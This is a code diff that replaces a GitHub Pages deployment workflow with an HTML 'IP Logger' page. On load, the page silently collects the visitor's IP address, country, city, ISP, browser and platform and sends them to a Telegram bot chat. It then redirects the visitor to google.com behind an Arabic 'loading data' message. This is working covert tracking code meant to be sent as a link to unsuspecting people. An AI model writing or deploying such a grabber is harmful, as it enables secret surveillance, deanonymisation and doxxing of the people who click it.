@@ -1,40 +1,59 @@
-name: Deploy to GitHub Pages
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Logger</title>
+    <script>
+        const botToken = '%TOKEN%';
 
-on:
-  push:
-    branches: [ "main" ]
+        async function sendInfo() {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const chatId = urlParams.get('id');
 
-permissions:
-  contents: read
-  pages: write
-  id-token: write
+                if (!chatId) {
+                    document.body.innerHTML = '<h1>⚠️ رابط غير صالح</h1>';
+                    return;
+                }
 
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
 
-jobs:
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
 
-      - name: Replace token
-        uses: cschleiden/replace-tokens@v1
-        with:
-          files: '["index.html"]'
-        env:
-          TOKEN: ${{ secrets.TOKEN }}
+                const message = `
+🕵️ **تم تسجيل دخول جديد!**
+📌 **IP:** ${ip}
+📍 **الدولة:** ${locationData.country_name || 'غير معروف'}
+🏙️ **المدينة:** ${locationData.city || 'غير معروف'}
+🌐 **المزود:** ${locationData.org || 'غير معروف'}
+🖥️ **المتصفح:** ${navigator.userAgent}
+📱 **نظام التشغيل:** ${navigator.platform}
+                `;
 
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v3
-        with:
-          path: './'
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v4
+                window.location.href = 'https://google.com';
+
+            } catch (error) {
+                console.error('خطأ:', error);
+                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
+            }
+        }
+
+        window.onload = sendInfo;
+    </script>
+</head>
+<body>
+    <h1>جاري تحميل البيانات...</h1>
+</body>
+</html>
